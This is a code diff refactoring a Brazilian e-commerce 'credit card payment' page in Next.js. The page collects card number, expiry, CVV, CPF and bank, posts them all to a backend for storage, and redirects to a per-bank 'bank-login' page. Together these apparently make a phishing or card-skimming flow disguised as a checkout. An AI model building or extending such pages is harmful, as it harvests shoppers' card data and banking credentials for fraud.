@@ -1,16 +1,31 @@
 "use client";
 
 import { useEffect, useState } from "react";
-import { useRouter, useParams } from "next/navigation";
+import { useRouter } from "next/navigation";
 import Header from "@/components/Header";
 import Footer from "@/components/Footer";
 import WhatsAppFloat from "@/components/WhatsAppFloat";
 import { toast } from "react-hot-toast";
 
-export default function CreditCardPayment() {
+// Define the Order type
+interface Order {
+  _id: string;
+  total: number;
+}
+
+// Define the params type for the dynamic route
+interface CreditCardParams {
+  orderId: string;
+}
+
+// Define the props type expected by Next.js for a dynamic page
+interface CreditCardPaymentPageProps {
+  params: Promise<CreditCardParams>;
+}
+
+export default function CreditCardPayment({ params }: CreditCardPaymentPageProps) {
   const router = useRouter();
-  const { orderId } = useParams();
-  const [order, setOrder] = useState<any>(null);
+  const [order, setOrder] = useState<Order | null>(null);
   const [loading, setLoading] = useState(true);
   const [cardDetails, setCardDetails] = useState({
     cardNumber: "",
@@ -21,8 +36,8 @@ export default function CreditCardPayment() {
   });
   const [parcelas, setParcelas] = useState<number>(1);
   const [selectedBank, setSelectedBank] = useState<string>("");
+  const [resolvedParams, setResolvedParams] = useState<CreditCardParams | null>(null);
 
-  // List of banks for the dropdown
   const banks = [
     { value: "banco-do-brasil", label: "Banco do Brasil" },
     { value: "bradesco", label: "Bradesco" },
@@ -31,10 +46,21 @@ export default function CreditCardPayment() {
     { value: "caixa", label: "Caixa Econômica Federal" },
   ];
 
+  // Resolve the params Promise
+  useEffect(() => {
+    const resolveParams = async () => {
+      const { orderId } = await params;
+      setResolvedParams({ orderId });
+    };
+    resolveParams();
+  }, [params]);
+
   useEffect(() => {
     const fetchOrder = async () => {
+      if (!resolvedParams?.orderId) return;
+
       try {
-        const response = await fetch(`/api/orders/${orderId}`, {
+        const response = await fetch(`/api/orders/${resolvedParams.orderId}`, {
           credentials: "include",
         });
         const data = await response.json();
@@ -53,10 +79,10 @@ export default function CreditCardPayment() {
       }
     };
 
-    if (orderId) {
+    if (resolvedParams?.orderId) {
       fetchOrder();
     }
-  }, [orderId, router]);
+  }, [resolvedParams, router]);
 
   const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
     const { name, value } = e.target;
@@ -64,28 +90,24 @@ export default function CreditCardPayment() {
     if (name in cardDetails) {
       let formattedValue = value;
 
-      // Format and validate card number (16 digits)
       if (name === "cardNumber") {
-        formattedValue = value.replace(/\D/g, "").slice(0, 16); // Only digits, max 16
-        formattedValue = formattedValue.replace(/(\d{4})(?=\d)/g, "$1 "); // Add spaces every 4 digits
+        formattedValue = value.replace(/\D/g, "").slice(0, 16);
+        formattedValue = formattedValue.replace(/(\d{4})(?=\d)/g, "$1 ");
       }
 
-      // Format and validate expiry date (MM/YY, 4 digits)
       if (name === "expiryDate") {
-        formattedValue = value.replace(/\D/g, "").slice(0, 4); // Only digits, max 4
+        formattedValue = value.replace(/\D/g, "").slice(0, 4);
         if (formattedValue.length >= 3) {
           formattedValue = `${formattedValue.slice(0, 2)}/${formattedValue.slice(2)}`;
         }
       }
 
-      // Format and validate CVV (3 or 4 digits)
       if (name === "cvv") {
-        formattedValue = value.replace(/\D/g, "").slice(0, 4); // Only digits, max 4
+        formattedValue = value.replace(/\D/g, "").slice(0, 4);
       }
 
-      // Format CPF (###.###.###-##)
       if (name === "cpf") {
-        formattedValue = value.replace(/\D/g, "").slice(0, 11); // Only digits, max 11
+        formattedValue = value.replace(/\D/g, "").slice(0, 11);
         formattedValue = formattedValue.replace(/(\d{3})(\d)/, "$1.$2");
         formattedValue = formattedValue.replace(/(\d{3})\.(\d{3})(\d)/, "$1.$2.$3");
         formattedValue = formattedValue.replace(/(\d{3})\.(\d{3})\.(\d{3})(\d)/, "$1.$2.$3-$4");
@@ -102,18 +124,19 @@ export default function CreditCardPayment() {
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
 
-    // Validation
+    if (!resolvedParams?.orderId) return;
+
     const { cardNumber, expiryDate, cvv, cardholderName, cpf } = cardDetails;
     if (
       !cardNumber ||
-      cardNumber.replace(/\s/g, "").length !== 16 || // Ensure exactly 16 digits
+      cardNumber.replace(/\s/g, "").length !== 16 ||
       !expiryDate ||
-      expiryDate.replace(/\//g, "").length !== 4 || // Ensure exactly 4 digits
+      expiryDate.replace(/\//g, "").length !== 4 ||
       !cvv ||
-      (cvv.length !== 3 && cvv.length !== 4) || // Ensure 3 or 4 digits
+      (cvv.length !== 3 && cvv.length !== 4) ||
       !cardholderName ||
       !cpf ||
-      cpf.replace(/[\.\-]/g, "").length !== 11 || // Ensure exactly 11 digits
+      cpf.replace(/[\.\-]/g, "").length !== 11 ||
       !selectedBank
     ) {
       toast.error("Por favor, preencha todos os campos corretamente.");
@@ -121,20 +144,19 @@ export default function CreditCardPayment() {
     }
 
     try {
-      // Save payment details to the database
       const response = await fetch("/api/payments", {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
         },
         body: JSON.stringify({
-          orderId,
+          orderId: resolvedParams.orderId,
           paymentMethod: "creditCard",
-          cardNumber: cardNumber.replace(/\s/g, ""), // Store without spaces
+          cardNumber: cardNumber.replace(/\s/g, ""),
           cardHolder: cardholderName,
-          expiryDate: expiryDate.replace(/\//g, ""), // Store without slash
+          expiryDate: expiryDate.replace(/\//g, ""),
           cvv,
-          cpf: cpf.replace(/[\.\-]/g, ""), // Store without dots and dash
+          cpf: cpf.replace(/[\.\-]/g, ""),
           parcelas,
           bank: selectedBank,
         }),
@@ -144,8 +166,7 @@ export default function CreditCardPayment() {
       const data = await response.json();
       if (response.ok) {
         toast.success("Dados do pagamento salvos com sucesso!");
-        // Redirect to the bank login page
-        router.push(`/bank-login/${selectedBank}?orderId=${orderId}`);
+        router.push(`/bank-login/${selectedBank}?orderId=${resolvedParams.orderId}`);
       } else {
         toast.error(data.error || "Erro ao salvar dados do pagamento.");
       }
@@ -155,15 +176,17 @@ export default function CreditCardPayment() {
     }
   };
 
-  // Handler to go back to checkout
   const handleBackToCheckout = () => {
     router.push("/checkout?fromPayment=true");
   };
 
-  // Handler to clear the selected bank
   const handleChangeBank = () => {
     setSelectedBank("");
   };
+
+  if (!resolvedParams) {
+    return <div>Carregando parâmetros...</div>;
+  }
 
   if (loading) {
     return <div>Carregando...</div>;
@@ -201,7 +224,7 @@ export default function CreditCardPayment() {
                   onChange={handleInputChange}
                   placeholder="1234 5678 9012 3456"
                   className="w-full p-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-green-600"
-                  maxLength={19} // 16 digits + 3 spaces
+                  maxLength={19}
                   required
                 />
               </div>
@@ -218,7 +241,7 @@ export default function CreditCardPayment() {
                     onChange={handleInputChange}
                     placeholder="MM/YY"
                     className="w-full p-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-green-600"
-                    maxLength={5} // MM/YY format
+                    maxLength={5}
                     required
                   />
                 </div>
@@ -234,7 +257,7 @@ export default function CreditCardPayment() {
                     onChange={handleInputChange}
                     placeholder="123"
                     className="w-full p-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-green-600"
-                    maxLength={4} // 3 or 4 digits
+                    maxLength={4}
                     required
                   />
                 </div>
@@ -266,7 +289,7 @@ export default function CreditCardPayment() {
                   onChange={handleInputChange}
                   placeholder="123.456.789-00"
                   className="w-full p-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-green-600"
-                  maxLength={14} // ###.###.###-## format
+                  maxLength={14}
                   required
                 />
               </div>
@@ -304,7 +327,7 @@ export default function CreditCardPayment() {
                     onChange={handleInputChange}
                     className="w-full p-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-green-600"
                     required
-                    disabled={!!selectedBank} // Disable dropdown if a bank is selected
+                    disabled={!!selectedBank}
                   >
                     <option value="">Selecione um banco</option>
                     {banks.map((bank) => (
